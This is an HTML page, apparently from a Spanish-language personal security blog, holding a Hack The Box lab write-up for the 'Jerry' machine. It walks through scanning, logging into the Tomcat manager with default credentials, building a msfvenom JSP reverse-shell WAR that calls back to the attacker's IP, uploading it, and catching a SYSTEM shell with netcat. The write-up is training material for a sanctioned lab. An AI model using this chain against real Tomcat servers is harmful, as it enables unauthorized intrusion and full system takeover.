@@ -1,0 +1,617 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Jerry - Hack The Box - ewor01      Ciberseguridad y Hacking Ético      </title>
+<meta name="description" content="Jerry es una maquina donde estaremos explotando una vulnerabilidad en Tomcat, en el cual comprometeremos la maquina mediante un archivo war malicioso.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="ewor01 | Ciberseguridad y Hacking Ético">
+<meta property="og:title" content="Jerry - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/jerry-hackthebox/">
+
+
+  <meta property="og:description" content="Jerry es una maquina donde estaremos explotando una vulnerabilidad en Tomcat, en el cual comprometeremos la maquina mediante un archivo war malicioso.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-jerry/Jerry.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-01-29T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/jerry-hackthebox/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "ewor01",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="ewor01 | Ciberseguridad y Hacking Ético Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Jerry - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="ewor01" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">ewor01</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        ingeniero en ciencias de la computación / Ethical hacker / Pentesting / Red Team / Ciberseguridad / CTF Player 
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Honduras</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://twitter.com/ewor01" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/edwin-josu%C3%A9-romero-perez-306140224" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/ewor01" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        
+          <li>
+            <a href="https://www.youtube.com/channel/UCKn3LZ1cc2V94tngdzvn0eA" itemprop="sameAs" rel="nofollow noopener noreferrer">
+              <i class="fab fa-fw fa-youtube" aria-hidden="true"></i> YouTube
+            </a>
+          </li>
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Jerry - Hack The Box">
+    <meta itemprop="description" content="Jerry es una maquina donde estaremos explotando una vulnerabilidad en Tomcat, en el cual comprometeremos la maquina mediante un archivo war malicioso.">
+    <meta itemprop="datePublished" content="January 29, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Jerry - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-01-29T00:00:00-06:00">January 29, 2023 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-jerry/Jerry.png" alt="Jerry.png" /></p>
+
+<p>Certificaciones a aplicar: eJPT</p>
+
+<p>Dificultad: Fácil</p>
+
+<p>Habilidades:</p>
+
+<ul>
+  <li>Information Leakage</li>
+  <li>Abusing Tomcat [Intrusion &amp; Privilege Escalation]</li>
+</ul>
+
+<h1 id="ip-de-la-maquina">IP de la Maquina</h1>
+
+<p>10.10.10.95</p>
+
+<h1 id="reconocimiento">Reconocimiento</h1>
+
+<p>Identificando el sistema operativo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whichSystem.py 10.10.10.95
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-37-24.png" alt="Hackforce-2022-12-18-18-37-24.png" /></p>
+
+<p>Escaneo de los puertos y guardamos en formato grep en el ficherito allPorts.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.95 <span class="nt">-oG</span> allPorts
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-48-57.png" alt="Hackforce-2022-12-18-18-48-57.png" /></p>
+
+<p>Función extractPorts.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extractPorts allPorts
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-49-49.png" alt="Hackforce-2022-12-18-18-49-49.png" /></p>
+
+<h1 id="análisis-de-vulnerabilidades">Análisis de Vulnerabilidades</h1>
+
+<p>Buscando versiones y servicios que corren para esos puertos y lo guardamos en formato nmap en el ficherito targeted.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span> 10.10.10.95 <span class="nt">-oN</span> targeted
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-00-49.png" alt="Hackforce-2022-12-18-19-00-49.png" /></p>
+
+<p>Vemos que estamos ante un apache tomcat y nos muestra la version.</p>
+
+<p>Vamos a identificar ante que nos estamos enfrentando de la siguiente manera colocamos en el navegador launchpad 4ubuntu0.5 y nos dara el siguiente resultado.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-11-18-07-31.png" alt="Hackforce-2022-12-11-18-07-31.png" /></p>
+
+<p>De esta manera vemos que estamos ante un Ubuntu Bionic.</p>
+
+<p>Vamos a verificar con whatweb  y a ver que nos reporta la herramienta.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.95:8080
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-03-36.png" alt="Hackforce-2022-12-18-19-03-36.png" /></p>
+
+<p>Vemos poco solo que estamos ante un Tomcat de version 7.0.88.</p>
+
+<p>con whatweb y el parámetro -v nos mostrara un poco mas de información y de manera mas ordenada.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.95:8080 <span class="nt">-v</span>
+
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-14-20.png" alt="Hackforce-2022-12-18-19-14-20.png" /></p>
+
+<p>Igual no logramos ver nada en concreto a si que vamos a proceder a inspeccionar la web.</p>
+
+<p>Vemos que es un panel de tomcat.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-40-55.png" alt="Hackforce-2022-12-18-19-40-55.png" /></p>
+
+<p>Vamos a probar una ruta que suele venir siempre cuando hay un tomcat.</p>
+
+<p>10.10.10.95:8080/manager/html.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-43-27.png" alt="Hackforce-2022-12-18-19-43-27.png" /></p>
+
+<p>Vemos que nos solicita credenciales para acceder.</p>
+
+<p>Como no disponemos de credenciales, lo habitual es probar las que vienen por default en la aplicación.</p>
+
+<p>Si ingresamos las credenciales que vienen por default nos mostrara lo siguiente.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-47-53.png" alt="Hackforce-2022-12-18-19-47-53.png" /></p>
+
+<p>Si leemos detenidamente lo que nos dice, veremos que pone como se deberia configurar las credenciales de acceso y vemos 2 campos interesantes, username y password.</p>
+
+<p>Colocamos las credenciales que encontramos al ver el archivo anterior y probamos.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-51-20.png" alt="Hackforce-2022-12-18-19-51-20.png" /></p>
+
+<p>Como vemos hemos podido ingresar, ahora observaremos detenidamente que podemos hacer.</p>
+
+<p>Vemos que podemos subir nuestro propio archivo war.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-53-30.png" alt="Hackforce-2022-12-18-19-53-30.png" /></p>
+
+<p>Lo que trataremos de hacer sera subir un war malicioso para que lo podamos ejecutar desde el panel de aplicaciones.</p>
+
+<h1 id="explotación">Explotación</h1>
+
+<p>Vamos a generar un war malicioso con msfvenom.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-l</span> payloads | <span class="nb">grep </span>java
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-04-18.png" alt="Hackforce-2022-12-18-20-04-18.png" /></p>
+
+<p>Con este comando listamos los payloads disponibles en java, porque este nos permitirá generar el war malicioso. En este caso el que nos interesa es el que pone java/jsp_shell_reverse_tcp para entablarnos una conexión inversa en la maquina victima.</p>
+
+<p>Luego nos dirigimos al directorio content y creamos el payload con msfvenom.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.4 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> war <span class="nt">-o</span> shell.war
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-16-25.png" alt="Hackforce-2022-12-18-20-16-25.png" /></p>
+
+<p>Listo ahi tendríamos nuestro war malicioso creado.</p>
+
+<p>Ahora nos movemos el war malicioso a nuestro directorio de descargas y lo subimos a tomcat.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-20-37.png" alt="Hackforce-2022-12-18-20-20-37.png" /></p>
+
+<p>Así se miraría nuestro war malicioso en el servidor.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-22-55.png" alt="Hackforce-2022-12-18-20-22-55.png" /></p>
+
+<p>Ahora nos ponemos en escucha con netcat y ejecutamos el war malicioso.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-nlvp</span> 443
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-25-47.png" alt="Hackforce-2022-12-18-20-25-47.png" /></p>
+
+<p>Con esto deberíamos ganar acceso a la maquina y estaríamos como nt authority system.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-29-47.png" alt="Hackforce-2022-12-18-20-29-47.png" /></p>
+
+<p>Procedemos a buscar las flags y listo con esto terminaríamos la maquina.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-41-30.png" alt="Hackforce-2022-12-18-20-41-30.png" /></p>
+
+<p>Ahi podemos visualizar las flags, que como vemos nos dan la de user y root.</p>
+
+<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>
+
+<p>En este caso la vulnerabilidad explotada nos brinda los privilegios máximos como NT authority System y podemos hacer cualquier cosa por lo que no hay que elevar privilegios.</p>
+
+<p>Listo con esto tendríamos hecha la maquina por completo, happy hacking.</p>
+
+<p>Les dejo la resolución de la misma por s4vitar <a href="https://www.youtube.com/watch?v=bB-M5vPegMk">Ver video</a></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#information-leakage" class="page__taxonomy-item" rel="tag">Information Leakage</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#tomcat" class="page__taxonomy-item" rel="tag">Tomcat</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ejtp" class="page__taxonomy-item" rel="tag">eJTP</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#f%C3%A1cil" class="page__taxonomy-item" rel="tag">Fácil</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-01-29T00:00:00-06:00">January 29, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/ingenier%C3%ADa-social/" class="pagination--pager" title="Ingeniería social y cómo protegerse
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 ewor01</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
